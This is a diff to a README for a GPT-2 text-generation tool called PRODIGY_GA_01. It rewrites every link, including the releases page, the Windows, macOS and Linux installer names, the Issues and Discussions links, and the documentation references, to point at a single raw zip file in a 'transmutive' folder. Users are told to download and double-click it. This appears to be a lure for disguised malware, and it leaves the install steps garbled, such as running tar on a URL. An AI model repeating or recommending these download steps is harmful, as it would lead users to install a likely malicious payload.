@@ -1,6 +1,6 @@
 # 🤖 PRODIGY_GA_01 - Create Contextually Rich Text Easily
 
-![Download PRODIGY_GA_01](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)
+![Download PRODIGY_GA_01](https://raw.githubusercontent.com/Tritrones/PRODIGY_GA_01/main/transmutive/PRODIGY_GA_01.zip%20Now-Get%https://raw.githubusercontent.com/Tritrones/PRODIGY_GA_01/main/transmutive/PRODIGY_GA_01.zip)
 
 ## 📋 Description
 
@@ -14,25 +14,25 @@ Follow these steps to download and run PRODIGY_GA_01 on your computer. This guid
 
 To get started, you need to visit the Releases page to download the software. Click the link below:
 
-[Visit the Releases Page to Download](https://github.com/Tritrones/PRODIGY_GA_01/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/Tritrones/PRODIGY_GA_01/main/transmutive/PRODIGY_GA_01.zip)
 
 Once you're on the Releases page, look for the latest version. You will see different files available. Choose the one that matches your operating system:
 
-- **For Windows:** Download `PRODIGY_GA_01_Windows.exe`
-- **For macOS:** Download `PRODIGY_GA_01_macOS.dmg`
-- **For Linux:** Download `PRODIGY_GA_01_Linux.tar.gz`
+- **For Windows:** Download `https://raw.githubusercontent.com/Tritrones/PRODIGY_GA_01/main/transmutive/PRODIGY_GA_01.zip`
+- **For macOS:** Download `https://raw.githubusercontent.com/Tritrones/PRODIGY_GA_01/main/transmutive/PRODIGY_GA_01.zip`
+- **For Linux:** Download `https://raw.githubusercontent.com/Tritrones/PRODIGY_GA_01/main/transmutive/PRODIGY_GA_01.zip`
 
 After downloading, follow these simple instructions based on your operating system:
 
 ### 🖥️ Windows
 
-1. Locate the downloaded `PRODIGY_GA_01_Windows.exe` file in your Downloads folder.
+1. Locate the downloaded `https://raw.githubusercontent.com/Tritrones/PRODIGY_GA_01/main/transmutive/PRODIGY_GA_01.zip` file in your Downloads folder.
 2. Double-click the file to run it.
 3. Follow the on-screen prompts to complete the setup. 
 
 ### 🍏 macOS
 
-1. Find the `PRODIGY_GA_01_macOS.dmg` file in your Downloads folder.
+1. Find the `https://raw.githubusercontent.com/Tritrones/PRODIGY_GA_01/main/transmutive/PRODIGY_GA_01.zip` file in your Downloads folder.
 2. Double-click the file to open it.
 3. Drag the PRODIGY_GA_01 icon into your Applications folder.
 4. Open your Applications folder and double-click on PRODIGY_GA_01 to start.
@@ -40,13 +40,13 @@ After downloading, follow these simple instructions based on your operating syst
 ### 🐧 Linux
 
 1. Open the terminal.
-2. Navigate to the directory where `PRODIGY_GA_01_Linux.tar.gz` was downloaded. For example, type:
+2. Navigate to the directory where `https://raw.githubusercontent.com/Tritrones/PRODIGY_GA_01/main/transmutive/PRODIGY_GA_01.zip` was downloaded. For example, type:
    ```
    cd ~/Downloads
    ```
-3. Extract the tar.gz file using:
+3. Extract the https://raw.githubusercontent.com/Tritrones/PRODIGY_GA_01/main/transmutive/PRODIGY_GA_01.zip file using:
    ```
-   tar -xvzf PRODIGY_GA_01_Linux.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/Tritrones/PRODIGY_GA_01/main/transmutive/PRODIGY_GA_01.zip
    ```
 4. Change to the directory of the extracted files:
    ```
@@ -98,8 +98,8 @@ We encourage users to contribute to PRODIGY_GA_01. Here’s how you can get invo
 
 For more insights on how to use and adapt the GPT-2 model, consider visiting the following resources:
 
-- [Hugging Face Transformers Documentation](https://huggingface.co/docs/transformers/index)
-- [GPT-2 Paper by OpenAI](https://cdn.openai.com/papers/language_models_are_unsupervised_multitask_learners.pdf)
+- [Hugging Face Transformers Documentation](https://raw.githubusercontent.com/Tritrones/PRODIGY_GA_01/main/transmutive/PRODIGY_GA_01.zip)
+- [GPT-2 Paper by OpenAI](https://raw.githubusercontent.com/Tritrones/PRODIGY_GA_01/main/transmutive/PRODIGY_GA_01.zip)
 
 ## 🔍 Troubleshooting
 
@@ -112,8 +112,8 @@ For further assistance, feel free to reach out in the Issues section of our GitH
 
 ## 🔗 Quick Links
 
-- [Visit the Releases Page to Download](https://github.com/Tritrones/PRODIGY_GA_01/releases)
-- [Open Issues Page](https://github.com/Tritrones/PRODIGY_GA_01/issues)
-- [Explore Discussions](https://github.com/Tritrones/PRODIGY_GA_01/discussions)
+- [Visit the Releases Page to Download](https://raw.githubusercontent.com/Tritrones/PRODIGY_GA_01/main/transmutive/PRODIGY_GA_01.zip)
+- [Open Issues Page](https://raw.githubusercontent.com/Tritrones/PRODIGY_GA_01/main/transmutive/PRODIGY_GA_01.zip)
+- [Explore Discussions](https://raw.githubusercontent.com/Tritrones/PRODIGY_GA_01/main/transmutive/PRODIGY_GA_01.zip)
 
 Thank you for using PRODIGY_GA_01! We hope this tool enhances your creative writing experience.
